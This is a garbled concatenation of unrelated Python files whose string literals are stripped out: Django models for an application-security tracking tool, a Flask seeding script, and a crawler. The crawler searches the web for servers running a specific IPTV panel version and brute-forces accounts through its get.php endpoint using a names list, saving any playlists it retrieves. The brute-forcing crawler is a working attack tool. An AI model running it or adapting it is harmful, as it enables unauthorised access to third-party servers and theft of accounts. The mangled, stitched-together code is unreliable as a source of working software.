SECURITY_OFFICER_ROLE = \n 
SECURITY_CHAMPION_ROLE = \n 
ROLE_CHOICES = ( \n 
( DEVELOPER_ROLE , ) , \n 
( QUALITY_ASSURANCE_ROLE , ) , \n 
( OPERATIONS_ROLE , ) , \n 
( MANAGER_ROLE , ) , \n 
( SECURITY_OFFICER_ROLE , ) , \n 
( SECURITY_CHAMPION_ROLE , ) , \n 
) \n 
\n 
first_name = models . CharField ( max_length = 64 ) \n 
last_name = models . CharField ( max_length = 64 ) \n 
email = models . EmailField ( max_length = 128 , unique = True ) \n 
role = models . CharField ( max_length = 17 , choices = ROLE_CHOICES ) \n 
phone_work = models . CharField ( max_length = 15 , validators = [ phone_regex ] , blank = True ) \n 
phone_mobile = models . CharField ( max_length = 15 , validators = [ phone_regex ] , blank = True ) \n 
job_title = models . CharField ( max_length = 128 , blank = True ) \n 
\n 
class Meta : \n 
~~~ ordering = [ ] \n 
verbose_name_plural = \n 
\n 
~~ def __str__ ( self ) : \n 
~~~ return self . first_name + + self . last_name \n 
\n 
~~ def save ( self , * args , ** kwargs ) : \n 
~~~ if self . phone_work : \n 
~~~ self . phone_work = phonenumbers . format_number ( phonenumbers . parse ( self . phone_work , ) , ~~ if self . phone_mobile : \n 
~~~ self . phone_mobile = phonenumbers . format_number ( phonenumbers . parse ( self . phone_mobile , ~~ self . email = self . email . lower ( ) \n 
super ( Person , self ) . save ( * args , ** kwargs ) \n 
\n 
\n 
~~ ~~ class Organization ( models . Model ) : \n 
~~~ """Entities under which applications belong.""" \n 
\n 
name = models . CharField ( max_length = 32 , unique = True , help_text = description = models . TextField ( blank = True , help_text = \n 
people = models . ManyToManyField ( Person , blank = True ) \n 
\n 
class Meta : \n 
~~~ ordering = [ ] \n 
\n 
~~ def __str__ ( self ) : \n 
~~~ return self . name \n 
\n 
\n 
~~ ~~ class DataElement ( models . Model ) : \n 
~~~ """An individual data element stored within an application. Used for data classification.""" \n 
\n 
GLOBAL_CATEGORY = \n 
PERSONAL_CATEGORY = \n 
COMPANY_CATEGORY = \n 
STUDENT_CATEGORY = \n 
GOVERNMENT_CATEGORY = \n 
PCI_CATEGORY = \n 
MEDICAL_CATEGORY = \n 
CATEGORY_CHOICES = ( \n 
( GLOBAL_CATEGORY , ) , \n 
( PERSONAL_CATEGORY , ) , \n 
( COMPANY_CATEGORY , ) , \n 
( STUDENT_CATEGORY , ) , \n 
( GOVERNMENT_CATEGORY , ) , \n 
( PCI_CATEGORY , ) , \n 
( MEDICAL_CATEGORY , ) , \n 
) \n 
\n 
name = models . CharField ( max_length = 128 , unique = True ) \n 
description = models . TextField ( blank = True ) \n 
category = models . CharField ( max_length = 10 , choices = CATEGORY_CHOICES ) \n 
weight = models . PositiveIntegerField ( ) \n 
\n 
class Meta : \n 
~~~ ordering = [ ] \n 
\n 
~~ def __str__ ( self ) : \n 
~~~ return self . name \n 
\n 
\n 
~~ ~~ class Technology ( models . Model ) : \n 
~~~ """Architectural details for an application.""" \n 
PROGRAMMING_LANGUAGE_CATEGORY = \n 
OPERATING_SYSTEM_CATEGORY = \n 
DATA_STORE_CATEGORY = \n 
FRAMEWORK_CATEGORY = \n 
THIRD_PARTY_COMPONENT = \n 
WEB_SERVER_CATEGORY = \n 
APPLICATION_SERVER_CATEGORY = \n 
HOSTING_PROVIDER_CATEGORY = \n 
DENIAL_OF_SERVICE_CATEGORY = \n 
FIREWALL_CATEGORY = \n 
CATEGORY_CHOICES = ( \n 
( PROGRAMMING_LANGUAGE_CATEGORY , ) , \n 
( OPERATING_SYSTEM_CATEGORY , ) , \n 
( DATA_STORE_CATEGORY , ) , \n 
( FRAMEWORK_CATEGORY , ) , \n 
( THIRD_PARTY_COMPONENT , ) , \n 
( APPLICATION_SERVER_CATEGORY , ) , \n 
( WEB_SERVER_CATEGORY , ) , \n 
( HOSTING_PROVIDER_CATEGORY , ) , \n 
( DENIAL_OF_SERVICE_CATEGORY , ) , \n 
( FIREWALL_CATEGORY , ) , \n 
) \n 
\n 
name = models . CharField ( max_length = 64 , help_text = ) \n 
category = models . CharField ( max_length = 21 , choices = CATEGORY_CHOICES , help_text = description = models . CharField ( max_length = 256 , blank = True , help_text = reference = models . URLField ( blank = True , help_text = ) \n 
\n 
class Meta : \n 
~~~ ordering = [ , ] \n 
verbose_name_plural = \n 
\n 
~~ def __str__ ( self ) : \n 
~~~ return self . get_category_display ( ) + + self . name \n 
\n 
\n 
~~ ~~ class Regulation ( models . Model ) : \n 
~~~ """Regulations applicable to applications.""" \n 
PRIVACY_CATEGORY = \n 
FINANCE_CATEGORY = \n 
EDUCATION_CATEGORY = \n 
MEDICAL_CATEGORY = \n 
OTHER_CATEGORY = \n 
CATEGORY_CHOICES = ( \n 
( PRIVACY_CATEGORY , ) , \n 
( FINANCE_CATEGORY , ) , \n 
( EDUCATION_CATEGORY , ) , \n 
( MEDICAL_CATEGORY , ) , \n 
( OTHER_CATEGORY , ) , \n 
) \n 
\n 
name = models . CharField ( max_length = 128 , help_text = ) \n 
acronym = models . CharField ( max_length = 20 , unique = True , help_text = category = models . CharField ( max_length = 9 , choices = CATEGORY_CHOICES , help_text = jurisdiction = models . CharField ( max_length = 64 , help_text = description = models . TextField ( blank = True , help_text = reference = models . URLField ( blank = True , help_text = ) \n 
\n 
class Meta : \n 
~~~ ordering = [ , , ] \n 
\n 
~~ def __str__ ( self ) : \n 
~~~ return self . acronym + + self . jurisdiction + \n 
\n 
\n 
~~ ~~ class ServiceLevelAgreement ( models . Model ) : \n 
~~~ """Service Level Agreements to be applied to applications.""" \n 
name = models . CharField ( max_length = 64 , help_text = ) \n 
description = models . CharField ( max_length = 256 , blank = True , help_text = \n 
class Meta : \n 
~~~ ordering = [ ] \n 
\n 
~~ def __str__ ( self ) : \n 
~~~ return self . name \n 
\n 
\n 
~~ ~~ class ThreadFix ( models . Model ) : \n 
~~~ """ThreadFix server connection information.""" \n 
\n 
name = models . CharField ( max_length = 32 , unique = True , help_text = host = models . URLField ( help_text = api_key = models . CharField ( max_length = 50 , help_text = verify_ssl = models . BooleanField ( default = True , help_text = \n 
class Meta : \n 
~~~ verbose_name = \n 
verbose_name_plural = \n 
\n 
~~ def __str__ ( self ) : \n 
~~~ return self . name + + self . host \n 
\n 
\n 
~~ ~~ class Application ( TimeStampedModel , models . Model ) : \n 
~~~ """Contains information about a software application.""" \n 
\n 
WEB_PLATFORM = \n 
DESKTOP_PLATFORM = \n 
MOBILE_PLATFORM = \n 
WEB_SERVICE_PLATFORM = \n 
PLATFORM_CHOICES = ( \n 
( WEB_PLATFORM , ) , \n 
( DESKTOP_PLATFORM , ) , \n 
( MOBILE_PLATFORM , ) , \n 
( WEB_SERVICE_PLATFORM , ) , \n 
) \n 
\n 
IDEA_LIFECYCLE = \n 
EXPLORE_LIFECYCLE = \n 
VALIDATE_LIFECYCLE = \n 
GROW_LIFECYCLE = \n 
SUSTAIN_LIFECYCLE = \n 
RETIRE_LIFECYCLE = \n 
LIFECYCLE_CHOICES = ( \n 
( IDEA_LIFECYCLE , ) , \n 
( EXPLORE_LIFECYCLE , ) , \n 
( VALIDATE_LIFECYCLE , ) , \n 
( GROW_LIFECYCLE , ) , \n 
( SUSTAIN_LIFECYCLE , ) , \n 
( RETIRE_LIFECYCLE , ) , \n 
) \n 
\n 
THIRD_PARTY_LIBRARY_ORIGIN = \n 
PURCHASED_ORIGIN = \n 
CONTRACTOR_ORIGIN = \n 
INTERNALLY_DEVELOPED_ORIGIN = \n 
OPEN_SOURCE_ORIGIN = \n 
OUTSOURCED_ORIGIN = \n 
ORIGIN_CHOICES = ( \n 
( THIRD_PARTY_LIBRARY_ORIGIN , ) , \n 
( PURCHASED_ORIGIN , ) , \n 
( CONTRACTOR_ORIGIN , ) , \n 
( INTERNALLY_DEVELOPED_ORIGIN , ) , \n 
( OPEN_SOURCE_ORIGIN , ) , \n 
( OUTSOURCED_ORIGIN , ) , \n 
) \n 
\n 
VERY_HIGH_CRITICALITY = \n 
HIGH_CRITICALITY = \n 
MEDIUM_CRITICALITY = \n 
LOW_CRITICALITY = \n 
VERY_LOW_CRITICALITY = \n 
NONE_CRITICALITY = \n 
BUSINESS_CRITICALITY_CHOICES = ( \n 
( VERY_HIGH_CRITICALITY , ) , \n 
( HIGH_CRITICALITY , ) , \n 
( MEDIUM_CRITICALITY , ) , \n 
( LOW_CRITICALITY , ) , \n 
( VERY_LOW_CRITICALITY , ) , \n 
( NONE_CRITICALITY , ) , \n 
) \n 
\n 
DCL_1 = 1 \n 
DCL_2 = 2 \n 
DCL_3 = 3 \n 
DCL_4 = 4 \n 
DATA_CLASSIFICATION_CHOICES = ( \n 
( None , ) , \n 
( DCL_1 , ) , \n 
( DCL_2 , ) , \n 
( DCL_3 , ) , \n 
( DCL_4 , ) , \n 
) \n 
\n 
ASVS_0 = 0 \n 
ASVS_1 = 1 \n 
ASVS_2 = 2 \n 
ASVS_3 = 3 \n 
ASVS_CHOICES = ( \n 
( None , ) , \n 
( ASVS_0 , ) , \n 
( ASVS_1 , ) , \n 
( ASVS_2 , ) , \n 
( ASVS_3 , ) , \n 
) \n 
\n 
# General \n 
name = models . CharField ( max_length = 128 , unique = True , help_text = description = models . TextField ( blank = True , help_text = \n 
# Metadata \n 
business_criticality = models . CharField ( max_length = 9 , choices = BUSINESS_CRITICALITY_CHOICES , blank platform = models . CharField ( max_length = 11 , choices = PLATFORM_CHOICES , blank = True , null = True ) \n 
lifecycle = models . CharField ( max_length = 8 , choices = LIFECYCLE_CHOICES , blank = True , null = True ) \n 
origin = models . CharField ( max_length = 19 , choices = ORIGIN_CHOICES , blank = True , null = True ) \n 
user_records = models . PositiveIntegerField ( blank = True , null = True , help_text = revenue = models . DecimalField ( max_digits = 15 , decimal_places = 2 , blank = True , null = True , help_text = external_audience = models . BooleanField ( default = False , help_text = internet_accessible = models . BooleanField ( default = False , help_text = requestable = models . NullBooleanField ( default = True , help_text = _ ( \n 
technologies = models . ManyToManyField ( Technology , blank = True ) \n 
regulations = models . ManyToManyField ( Regulation , blank = True ) \n 
service_level_agreements = models . ManyToManyField ( ServiceLevelAgreement , blank = True ) \n 
\n 
# Data Classification \n 
# TODO Move to Data Classification Benchmark \n 
data_elements = models . ManyToManyField ( DataElement , blank = True ) \n 
override_dcl = models . IntegerField ( choices = DATA_CLASSIFICATION_CHOICES , blank = True , null = True , help_text override_reason = models . TextField ( blank = True , help_text = \n 
# ThreadFix \n 
threadfix = models . ForeignKey ( ThreadFix , blank = True , null = True , help_text = threadfix_team_id = models . PositiveIntegerField ( blank = True , null = True , help_text = threadfix_application_id = models . PositiveIntegerField ( blank = True , null = True , help_text = \n 
# OWASP \n 
# TODO Move to OWASP ASVS Benchmark \n 
asvs_level = models . IntegerField ( choices = ASVS_CHOICES , blank = True , null = True , help_text = asvs_level_percent_achieved = models . PositiveIntegerField ( blank = True , null = True , help_text = asvs_doc_url = models . URLField ( blank = True , help_text = ) \n 
asvs_level_target = models . IntegerField ( choices = ASVS_CHOICES , blank = True , null = True , help_text = \n 
# Misc \n 
\n 
"""\n    source code repo\n    bug tracking tool\n    developer experience / familiarity\n    programming language/s\n    id for whitehat + checkmarx (third-party ids)\n    password policy\n    """ \n 
\n 
organization = models . ForeignKey ( Organization , help_text = people = models . ManyToManyField ( Person , through = , blank = True ) \n 
tags = models . ManyToManyField ( Tag , blank = True ) \n 
\n 
objects = managers . ApplicationManager . from_queryset ( managers . ApplicationQuerySet ) ( ) \n 
\n 
class Meta : \n 
~~~ get_latest_by = \n 
ordering = [ ] \n 
\n 
~~ def __str__ ( self ) : \n 
~~~ return self . name \n 
\n 
~~ def data_classification_level ( self ) : \n 
~~~ """Returns the data classification level of the selected data elements.""" \n 
return helpers . data_classification_level ( self . data_sensitivity_value ( ) ) \n 
\n 
~~ def data_sensitivity_value ( self ) : \n 
~~~ """Returns the calculated data sensitivity value of the selected data elements.""" \n 
return helpers . data_sensitivity_value ( self . data_elements . all ( ) ) \n 
\n 
~~ def is_new ( self ) : \n 
~~~ """Returns true if the application was created in the last 7 days""" \n 
delta = self . created_date - timezone . now ( ) \n 
return delta >= timedelta ( days = - 7 ) \n 
\n 
\n 
~~ ~~ class ThreadFixMetrics ( TimeStampedModel , models . Model ) : \n 
~~~ """Point in time metrics from ThreadFix for an application.""" \n 
\n 
critical_count = models . PositiveIntegerField ( default = 0 ) \n 
high_count = models . PositiveIntegerField ( default = 0 ) \n 
medium_count = models . PositiveIntegerField ( default = 0 ) \n 
low_count = models . PositiveIntegerField ( default = 0 ) \n 
informational_count = models . PositiveIntegerField ( default = 0 ) \n 
\n 
application = models . ForeignKey ( Application ) \n 
\n 
class Meta : \n 
~~~ get_latest_by = \n 
verbose_name = \n 
verbose_name_plural = \n 
\n 
~~ def total ( self ) : \n 
~~~ return self . critical_count + self . high_count + self . medium_count + self . low_count + self . informational_count \n 
\n 
~~ ~~ class Relation ( models . Model ) : \n 
~~~ """Associates a person with an application with a role.""" \n 
\n 
owner = models . BooleanField ( default = False , help_text = emergency = models . BooleanField ( default = False , help_text = notes = models . TextField ( blank = True , help_text = \n 
person = models . ForeignKey ( Person , help_text = ) \n 
application = models . ForeignKey ( Application ) \n 
\n 
class Meta : \n 
~~~ unique_together = ( , ) \n 
\n 
~~ def __str__ ( self ) : \n 
~~~ return self . person . first_name + + self . person . last_name + + self . application . name \n 
\n 
\n 
~~ ~~ class Environment ( models . Model ) : \n 
~~~ """Container for information about a web server environment.""" \n 
\n 
DEVELOPMENT_ENVIRONMENT = \n 
INTEGRATION_ENVIRONMENT = \n 
QUALITY_ASSURANCE_ENVIRONMENT = \n 
PRE_PRODUCTION_ENVIRONMENT = \n 
CUSTOMER_ACCEPTANCE_ENVIRONMENT = \n 
PRODUCTION_ENVIRONMENT = \n 
ENVIRONMENT_CHOICES = ( \n 
( DEVELOPMENT_ENVIRONMENT , ) , \n 
( INTEGRATION_ENVIRONMENT , ) , \n 
( QUALITY_ASSURANCE_ENVIRONMENT , ) , \n 
( PRE_PRODUCTION_ENVIRONMENT , ) , \n 
( CUSTOMER_ACCEPTANCE_ENVIRONMENT , ) , \n 
( PRODUCTION_ENVIRONMENT , ) , \n 
) \n 
\n 
environment_type = models . CharField ( max_length = 4 , choices = ENVIRONMENT_CHOICES , help_text = description = models . TextField ( blank = True , help_text = testing_approved = models . BooleanField ( default = False , help_text = \n 
application = models . ForeignKey ( Application ) \n 
\n 
class Meta : \n 
~~~ ordering = [ , ] \n 
\n 
~~ def __str__ ( self ) : \n 
~~~ return self . application . name + + dict ( Environment . ENVIRONMENT_CHOICES ) [ self . environment_type \n 
\n 
~~ ~~ class EnvironmentLocation ( models . Model ) : \n 
~~~ """URL for a specific environment""" \n 
\n 
location = models . URLField ( help_text = notes = models . TextField ( blank = True , help_text = \n 
environment = models . ForeignKey ( Environment ) \n 
\n 
def __str__ ( self ) : \n 
~~~ return self . location \n 
\n 
\n 
~~ ~~ class EnvironmentCredentials ( TimeStampedModel , models . Model ) : \n 
~~~ """Credentials for a specific environment.""" \n 
\n 
username = models . CharField ( max_length = 128 , blank = True ) \n 
password = models . CharField ( max_length = 128 , blank = True ) \n 
role_description = models . CharField ( max_length = 128 , blank = True , help_text = notes = models . TextField ( blank = True , help_text = \n 
environment = models . ForeignKey ( Environment ) \n 
\n 
class Meta : \n 
~~~ verbose_name_plural = \n 
ordering = [ , ] \n 
\n 
\n 
~~ ~~ class Engagement ( TimeStampedModel , models . Model ) : \n 
~~~ """Container for activities performed for an application over a duration.""" \n 
\n 
PENDING_STATUS = \n 
OPEN_STATUS = \n 
CLOSED_STATUS = \n 
STATUS_CHOICES = ( \n 
( PENDING_STATUS , ) , \n 
( OPEN_STATUS , ) , \n 
( CLOSED_STATUS , ) \n 
) \n 
\n 
status = models . CharField ( max_length = 7 , choices = STATUS_CHOICES , default = PENDING_STATUS ) \n 
start_date = models . DateField ( help_text = ) \n 
end_date = models . DateField ( help_text = ) \n 
description = models . TextField ( blank = True ) \n 
\n 
open_date = models . DateTimeField ( blank = True , null = True , help_text = close_date = models . DateTimeField ( blank = True , null = True , help_text = duration = models . DurationField ( blank = True , null = True ) \n 
\n 
requestor = models . ForeignKey ( Person , blank = True , null = True , help_text = application = models . ForeignKey ( Application ) \n 
\n 
objects = managers . EngagementManager . from_queryset ( managers . EngagementQuerySet ) ( ) \n 
metrics = managers . EngagementMetrics . from_queryset ( managers . EngagementQuerySet ) ( ) \n 
\n 
class Meta : \n 
~~~ get_latest_by = \n 
ordering = [ ] \n 
\n 
~~ def save ( self , * args , ** kwargs ) : \n 
~~~ """Automatically sets the open and closed dates when the status changes.""" \n 
if self . pk is not None : \n 
~~~ engagement = Engagement . objects . get ( pk = self . pk ) \n 
now = timezone . now ( ) \n 
if engagement . status != self . status : \n 
~~~ if self . status == Engagement . PENDING_STATUS : \n 
~~~ self . open_date = None \n 
self . close_date = None \n 
~~ elif self . status == Engagement . OPEN_STATUS : \n 
~~~ self . open_date = now \n 
self . close_date = None \n 
~~ elif self . status == Engagement . CLOSED_STATUS : \n 
~~~ if self . open_date is None : \n 
~~~ self . open_date = now \n 
~~ self . close_date = now \n 
\n 
~~ ~~ ~~ if self . open_date is not None and self . close_date is not None : \n 
~~~ self . duration = self . close_date - self . open_date \n 
~~ super ( Engagement , self ) . save ( * args , ** kwargs ) \n 
\n 
~~ def is_pending ( self ) : \n 
~~~ return self . status == Engagement . PENDING_STATUS \n 
\n 
~~ def is_open ( self ) : \n 
~~~ return self . status == Engagement . OPEN_STATUS \n 
\n 
~~ def is_closed ( self ) : \n 
~~~ return self . status == Engagement . CLOSED_STATUS \n 
\n 
~~ def is_ready_for_work ( self ) : \n 
~~~ """If the engagement is pending on or after the start date.""" \n 
if self . status == Engagement . PENDING_STATUS : \n 
~~~ if date . today ( ) >= self . start_date : \n 
~~~ return True \n 
~~ ~~ return False \n 
\n 
~~ def is_past_due ( self ) : \n 
~~~ """If the engagement is not closed by the end date.""" \n 
if self . status == Engagement . PENDING_STATUS or self . status == Engagement . OPEN_STATUS : \n 
~~~ if date . today ( ) > self . end_date : \n 
~~~ return True \n 
~~ ~~ return False \n 
\n 
\n 
~~ ~~ class ActivityType ( TimeStampedModel , models . Model ) : \n 
~~~ """Types of work.""" \n 
\n 
name = models . CharField ( max_length = 128 , unique = True , help_text = _ ( documentation = models . TextField ( blank = True , help_text = _ ( \n 
objects = managers . ActivityTypeManager . from_queryset ( managers . ActivityTypeQuerySet ) ( ) \n 
metrics = managers . ActivityTypeMetrics . from_queryset ( managers . ActivityTypeQuerySet ) ( ) \n 
\n 
class Meta : \n 
~~~ ordering = [ ] \n 
\n 
~~ def __str__ ( self ) : \n 
~~~ return self . name \n 
\n 
\n 
~~ ~~ class Activity ( models . Model ) : \n 
~~~ """A unit of work performed for an application over a duration.""" \n 
\n 
PENDING_STATUS = \n 
OPEN_STATUS = \n 
CLOSED_STATUS = \n 
STATUS_CHOICES = ( \n 
( PENDING_STATUS , ) , \n 
( OPEN_STATUS , ) , \n 
( CLOSED_STATUS , ) \n 
) \n 
\n 
status = models . CharField ( max_length = 7 , choices = STATUS_CHOICES , default = PENDING_STATUS ) \n 
description = models . TextField ( blank = True ) \n 
open_date = models . DateTimeField ( blank = True , null = True , help_text = close_date = models . DateTimeField ( blank = True , null = True , help_text = duration = models . DurationField ( blank = True , null = True ) \n 
\n 
activity_type = models . ForeignKey ( ActivityType ) \n 
engagement = models . ForeignKey ( Engagement ) \n 
users = models . ManyToManyField ( settings . AUTH_USER_MODEL , blank = True ) \n 
\n 
objects = managers . ActivityManager . from_queryset ( managers . ActivityQuerySet ) ( ) \n 
\n 
class Meta : \n 
~~~ ordering = [ ] \n 
verbose_name_plural = \n 
\n 
~~ def __str__ ( self ) : \n 
~~~ return self . activity_type . name \n 
\n 
~~ def save ( self , * args , ** kwargs ) : \n 
~~~ """\n        Automatically sets the open and closed dates when the status changes.\n        Opens parent engagement if child activity is opened.\n        Closes parent engagement if all child activities are closed.\n        """ \n 
if self . pk is not None : \n 
~~~ activity = Activity . objects . get ( pk = self . pk ) \n 
if activity . status != self . status : # When status changed \n 
~~~ now = timezone . now ( ) \n 
if self . status == Activity . PENDING_STATUS : \n 
~~~ self . open_date = None \n 
self . close_date = None \n 
~~ elif self . status == Activity . OPEN_STATUS : \n 
~~~ self . open_date = now \n 
self . close_date = None \n 
\n 
# Open the parent engagement if the activity is opened \n 
if self . engagement . status is not Engagement . OPEN_STATUS : \n 
~~~ self . engagement . status = Engagement . OPEN_STATUS \n 
self . engagement . save ( ) \n 
~~ ~~ elif self . status == Activity . CLOSED_STATUS : \n 
~~~ if self . open_date is None : \n 
~~~ self . open_date = now \n 
~~ self . close_date = now \n 
\n 
# If all of the parent engagement activities are closed, close the parent engagement close = True \n 
for current_activity in self . engagement . activity_set . exclude ( id = self . id ) : \n 
~~~ if current_activity . status != Activity . CLOSED_STATUS : \n 
~~~ close = False \n 
break \n 
~~ ~~ if close : \n 
~~~ self . engagement . status = Engagement . CLOSED_STATUS \n 
self . engagement . save ( ) \n 
~~ ~~ ~~ ~~ if self . open_date is not None and self . close_date is not None : \n 
~~~ self . duration = self . close_date - self . open_date \n 
~~ super ( Activity , self ) . save ( * args , ** kwargs ) \n 
\n 
~~ def is_pending ( self ) : \n 
~~~ return self . status == Activity . PENDING_STATUS \n 
\n 
~~ def is_open ( self ) : \n 
~~~ return self . status == Activity . OPEN_STATUS \n 
\n 
~~ def is_closed ( self ) : \n 
~~~ return self . status == Activity . CLOSED_STATUS \n 
\n 
~~ def is_ready_for_work ( self ) : \n 
~~~ """If the activity is pending on or after the parent engagement\'s start date.""" \n 
if self . status == Activity . PENDING_STATUS : \n 
~~~ if date . today ( ) >= self . engagement . start_date : \n 
~~~ return True \n 
~~ ~~ return False \n 
\n 
~~ def is_past_due ( self ) : \n 
~~~ """If the activity is not closed by the parent engagement\'s end date.""" \n 
if self . status == Activity . PENDING_STATUS or self . status == Activity . OPEN_STATUS : \n 
~~~ if date . today ( ) > self . engagement . end_date : \n 
~~~ return True \n 
~~ ~~ return False \n 
\n 
\n 
~~ ~~ class Comment ( TimeStampedModel , models . Model ) : \n 
~~~ """Abstract message about an engagement or activity.""" \n 
\n 
message = models . TextField ( ) \n 
\n 
user = models . ForeignKey ( settings . AUTH_USER_MODEL ) \n 
\n 
def __str__ ( self ) : \n 
~~~ return self . message \n 
\n 
~~ class Meta : \n 
~~~ abstract = True \n 
\n 
\n 
~~ ~~ class EngagementComment ( Comment ) : \n 
~~~ """Comment for a specific engagement.""" \n 
\n 
engagement = models . ForeignKey ( Engagement ) \n 
\n 
\n 
~~ class ActivityComment ( Comment ) : \n 
~~~ """Comment for a specific activity.""" \n 
\n 
activity = models . ForeignKey ( Activity ) \n 
\n 
\n 
~~ class ExternalRequest ( TimeStampedModel , models . Model ) : \n 
~~~ """An external request for engagement.""" \n 
\n 
token = models . UUIDField ( default = uuid . uuid4 , editable = False ) \n 
\n 
requestor = models . ForeignKey ( Person ) \n 
application = models . ForeignKey ( Application , blank = True ) \n 
activities = models . ManyToManyField ( ActivityType , limit_choices_to = { : True } ) \n 
# Application FK \n 
# Person FK (Can be blank) \n 
# Requested Activities (Multiple) \n 
# Status Page UUID \n 
# Created Engagement (blank) \n 
\n 
# Some sort of accept/decline/other status \n 
\n 
\n 
~~ class FileUpload ( TimeStampedModel , models . Model ) : \n 
~~~ """Abstract file upload by a user.""" \n 
\n 
file = models . FileField ( ) \n 
\n 
user = models . ForeignKey ( settings . AUTH_USER_MODEL ) \n 
\n 
class Meta : \n 
~~~ abstract = True \n 
\n 
\n 
~~ ~~ class ApplicationFileUpload ( FileUpload ) : \n 
~~~ """A file uploaded associated with an application.""" \n 
\n 
REPORT_FILE_TYPE = \n 
DOCUMENTATION_FILE_TYPE = \n 
FILE_TYPE_CHOICES = ( \n 
( REPORT_FILE_TYPE , ) , \n 
( DOCUMENTATION_FILE_TYPE , ) , \n 
) \n 
\n 
# Draft boolean field \n 
\n 
file_type = models . CharField ( max_length = 13 , choices = FILE_TYPE_CHOICES ) \n 
\n 
application = models . ForeignKey ( Application ) \n 
~~ """Initialize DB with fixtures.""" \n 
from time import sleep \n 
from flask import Flask \n 
from flask_tut . models import ( \n 
db , \n 
User , \n 
Address , \n 
) \n 
\n 
app = Flask ( __name__ ) \n 
\n 
with app . app_context ( ) : \n 
~~~ db . create_all ( ) \n 
\n 
~~ i = 0 \n 
while i < 30 : \n 
~~~ address = Address ( description = + str ( i ) . rjust ( 2 , "0" ) ) \n 
db . session . add ( address ) \n 
user = User ( name = + str ( i ) . rjust ( 2 , "0" ) ) \n 
user . address = address \n 
db . session . add ( user ) \n 
sleep ( 1 ) \n 
i += 1 \n 
~~ db . session . commit ( ) \n 
import urllib2 \n 
import google \n 
import time \n 
import pyprind \n 
import os \n 
import random \n 
from urlparse import urlparse \n 
\n 
"""Crawler\nClass that handles the crawling process that fetch accounts on illegal IPTVs\n\nAuthors:\nClaudio Ludovico (@Ludo237)\nPinperepette (@Pinperepette)\nArm4x (@Arm4x)\n""" \n 
class Crawler ( object ) : \n 
# version \n 
~~~ version = "1.2.3" \n 
# output default directory \n 
outputDir = "output" \n 
# language default directory \n 
languageDir = "languages" \n 
# string used to exploit the CMS \n 
basicString = "/get.php?username=%s&password=%s&type=m3u&output=mpegts" \n 
# string used to search the CMS \n 
searchString = "Xtream Codes v1.0.59.5" \n 
\n 
def __init__ ( self , language = "it" ) : \n 
~~~ """Default constructor\n\n        Keyword arguments:\n        language -- Language parameter allows us to understand what kind of\n                    names file we need to use. (default it)\n        """ \n 
self . language = language . lower ( ) \n 
self . parsedUrls = [ ] \n 
self . foundedAccounts = 0 \n 
\n 
~~ def change_language ( self , language = "it" ) : \n 
~~~ """Set the language you want to use to brute force names\n\n        Keyword arguments:\n        language -- Language parameter allows us to understand what kind of\n                    names file we need to use. (default it)\n\n        Return:\n        boolean -- true if the language file exists, otherwise false\n        """ \n 
if os . path . isfile ( self . languageDir + "/" + language + ".txt" ) : \n 
~~~ self . language = language \n 
return True \n 
~~ else : \n 
~~~ return False \n 
\n 
~~ ~~ def search_links ( self ) : \n 
~~~ """Print the first 30 links from a Web search\n\n        We set the limit of 30 links because this script serve as demonstration and it\'s\n        not intended to be use for personal purpose.\n        """ \n 
for url in google . search ( self . searchString , num = 30 , stop = 1 ) : \n 
~~~ parsed = urlparse ( url ) \n 
self . parsedUrls . append ( parsed . scheme + "://" + parsed . netloc ) \n 
\n 
~~ ~~ def search_accounts ( self , url = None ) : \n 
~~~ """Search Accounts\n        This is the core method. It will crawl the give url for any possible accounts\n        If we found any we will create a new directory under /output with the name\n        of the site plus every account as five .m3u. Please use VLC for opening that\n        kind of files\n\n        Keyword arguments:\n        url -- an url from the fetched list. (default None)\n\n        Return:\n        string -- the status of the crawling session\n        """ \n 
if not self . parsedUrls : \n 
~~~ return "You must fetch some URLs first" \n 
~~ try : \n 
~~~ if not url : \n 
~~~ url = random . choice ( self . parsedUrls ) \n 
~~ fileName = self . languageDir + "/" + self . language + ".txt" \n 
fileLength = self . file_length ( fileName ) \n 
progressBar = pyprind . ProgBar ( fileLength , title = "Fetching account from " + url + " this might take a while." foundedAccounts = 0 \n 
with open ( fileName ) as f : \n 
~~~ rows = f . readlines ( ) \n 
~~ for row in rows : \n 
# Do the injection to the current url using the exploit that we know \n 
~~~ opener = urllib2 . build_opener ( ) \n 
opener . addheaders = [ ( , ) ] \n 
response = opener . open ( url + self . basicString % ( row . rstrip ( ) . lstrip ( ) , row . rstrip ( ) fetched = response . read ( ) \n 
# Update the progress bar in order to give to the user a nice \n 
# way to indicate the time left \n 
fileLength = fileLength - 1 \n 
progressBar . update ( ) \n 
# IF the fetched content is not empty \n 
# we build the dedicated .m3u file \n 
if len ( fetched ) > 0 : \n 
~~~ newPath = self . outputDir + "/" + url . replace ( "http://" , "" ) \n 
self . create_file ( row , newPath , fetched ) \n 
# Remove the current used url in order to avoid to parse it again \n 
~~ ~~ self . parsedUrls . remove ( url ) \n 
if self . foundedAccounts != 0 : \n 
~~~ return "Search done, account founded on " + url + ": " + str ( self . foundedAccounts ) \n 
~~ else : \n 
~~~ return "No results for " + url \n 
~~ ~~ except IOError : \n 
~~~ return "Cannot open the current Language file. Try another one" \n 
~~ except urllib2 . HTTPError , e : \n 
~~~ return "Ops, HTTPError exception here. Cannot fetch the current URL " + str ( e . code ) \n 
~~ except urllib2 . URLError , e : \n 
~~~ return "Ops, the URL seems broken." + str ( e . reason ) \n 
~~ except Exception : \n 
~~~ return "Ops something went wrong!" \n 
\n 
~~ ~~ def create_file ( self , row , newPath , fetched ) : \n 
~~~ """Create File\n        Once the parse founds something worth it, we need to create the .m3u file\n        to do so we except a newPath and the current row used from names file and also\n        the content from the fetched response\n\n        Keyword arguments:\n        row -- row of the language file, this allow us to understand which names\n        were useful for the brute force.\n\n        newPath -- The path that we use to store the current fetched accounts.\n\n        fetched -- the current response file from the attack.\n        """ \n 
if os . path . exists ( newPath ) is False : \n 
~~~ os . makedirs ( newPath ) \n 
~~ outputFile = open ( str ( newPath ) + "/tv_channels_%s.m3u" % row . rstrip ( ) . lstrip ( ) , "w" ) \n 
outputFile . write ( fetched ) \n 
self . foundedAccounts = self . foundedAccounts + 1 \n 
outputFile . close ( ) \n 
\n 
~~ def file_length ( self , fileName ) : \n 
~~~ """File Length\n        Cheapest way to calculate the rows of a file\n\n        Keyword arguments:\n        fileName -- string the filename into which we will check its Length\n        """ \n 
with open ( fileName ) as f : \n 
~~~ for i , l in enumerate ( f ) : \n 
~~~ pass \n 
~~ ~~ return i + 1 \n 
# Written by Bram Cohen \n 
# see LICENSE.txt for license information \n 
\n 
